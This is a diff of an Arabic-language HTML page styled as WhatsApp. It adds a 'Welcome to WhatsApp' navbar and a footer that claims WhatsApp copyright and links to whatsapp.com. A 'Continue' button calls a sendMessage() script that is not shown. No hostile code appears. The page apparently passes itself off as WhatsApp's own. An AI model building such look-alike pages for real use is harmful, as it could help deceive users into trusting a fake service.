@@ -13,9 +13,20 @@
             margin: 0;
             padding: 0;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
+            justify-content: space-between;
             align-items: center;
             height: 100vh;
+        }
+
+        .navbar {
+            width: 100%;
+            background-color: #25D366;
+            color: #fff;
+            padding: 10px 20px;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
         }
 
         .container {
@@ -86,15 +97,30 @@
             background-color: #1DA955;
         }
 
-        footer {
-            margin-top: 20px;
+        .footer {
+            width: 100%;
+            background-color: #f1f1f1;
+            color: #888;
+            padding: 10px 20px;
+            text-align: center;
             font-size: 12px;
-            color: #aaa;
+        }
+
+        .footer a {
+            color: #25D366;
+            text-decoration: none;
+            font-weight: bold;
         }
     </style>
 </head>
 
 <body>
+    <!-- الشريط العلوي -->
+    <div class="navbar">
+        أهلاً بك في واتساب
+    </div>
+
+    <!-- الحاوية الرئيسية -->
     <div class="container">
         <!-- شعار واتساب -->
         <div class="logo">
@@ -116,6 +142,11 @@
 
         <!-- زر المتابعة -->
         <button onclick="sendMessage()">متابعة</button>
+    </div>
+
+    <!-- الشريط السفلي -->
+    <div class="footer">
+        © 2024 واتساب. جميع الحقوق محفوظة. <a href="https://www.whatsapp.com/legal/">سياسة الخصوصية</a> | <a href="https://www.whatsapp.com/">المساعدة</a>
     </div>
 
     <script>
